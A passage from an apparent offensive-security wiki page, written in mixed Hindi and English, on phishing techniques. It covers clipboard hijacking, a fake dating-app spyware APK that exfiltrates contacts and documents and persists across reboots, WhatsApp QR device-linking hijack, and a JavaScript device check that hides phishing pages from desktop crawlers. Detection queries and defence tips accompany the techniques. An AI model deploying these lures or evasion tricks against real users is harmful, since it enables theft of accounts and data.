Attackers चुपचाप compromised या typosquatted वेब पेज से पीड़ित के clipboard में malicious commands कॉपी कर सकते हैं और फिर यूज़र को धोखा देकर उन्हें **Win + R**, **Win + X** या एक terminal विंडो में paste करवा कर arbitrary code execute करा सकते हैं बिना किसी download या attachment के।


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* APK में static credentials और per-profile “unlock codes” एम्बेड होते हैं (कोई server auth नहीं)। पीड़ित एक fake exclusivity flow का पालन करते हैं (login → locked profiles → unlock) और सही कोड पर उन्हें attacker-controlled `+92` नंबरों वाले WhatsApp chats में रीडायरेक्ट कर दिया जाता है जबकि spyware चुपचाप चलता रहता है।
* Collection login से पहले ही शुरू हो जाती है: immediate exfil of **device ID**, contacts (as `.txt` from cache), और documents (images/PDF/Office/OpenXML). एक content observer नए photos को auto-upload कर देता है; एक scheduled job हर **5 minutes** नए documents के लिए re-scan करता है।
* Persistence: `BOOT_COMPLETED` के लिए register करता है और reboots और background evictions से बचने के लिए एक **foreground service** को चालू रखता है।

### WhatsApp device-linking hijack via QR social engineering
* एक lure पेज (उदा., fake ministry/CERT “channel”) WhatsApp Web/Desktop QR दिखाता है और पीड़ित को इसे scan करने का निर्देश देता है, चुपचाप हमलावर को एक **linked device** के रूप में जोड़ देता है।
* हमलावर तुरंत chat/contact visibility हासिल कर लेता है जब तक session हटाया नहीं जाता। पीड़ित बाद में “new device linked” notification देख सकते हैं; defenders untrusted QR पेजों पर विज़िट के तुरंत बाद unexpected device-link events के लिए hunt कर सकते हैं।

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators अपने phishing flows को एक सरल device check के पीछे gate कर रहे हैं ताकि desktop crawlers कभी final pages तक न पहुँचें। एक सामान्य पैटर्न एक छोटा सा script है जो touch-capable DOM को टेस्ट करता है और परिणाम एक server endpoint पर पोस्ट करता है; non‑mobile clients को HTTP 500 (या एक blank page) मिलता है, जबकि mobile users को पूरा flow सर्व किया जाता है।

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` लॉजिक (सरलीकृत):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behaviour often observed:
- प्रथम लोड के दौरान session cookie सेट करता है।
- `POST /detect {"is_mobile":true|false}` स्वीकार करता है।
- `is_mobile=false` होने पर बाद के GET अनुरोधों पर 500 (या placeholder) लौटाता है; केवल यदि `true` हो तो ही phishing परोसता है।

Hunting and detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → non‑mobile के लिए HTTP 500; वैध mobile victim paths 200 लौटाते हैं और follow‑on HTML/JS भेजते हैं।
- केवल `ontouchstart` या समान device checks पर आधारित content कंडीशन करने वाले पृष्ठों को ब्लॉक या गहन रूप से जाँचें।

Defence tips:
- crawlers को mobile‑like fingerprints और JS सक्षम करके चलाएँ ताकि gated content प्रकट हो सके।
- नए पंजीकृत डोमेन पर `POST /detect` के बाद संदिग्ध 500 responses पर अलर्ट करें।

## संदर्भ

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
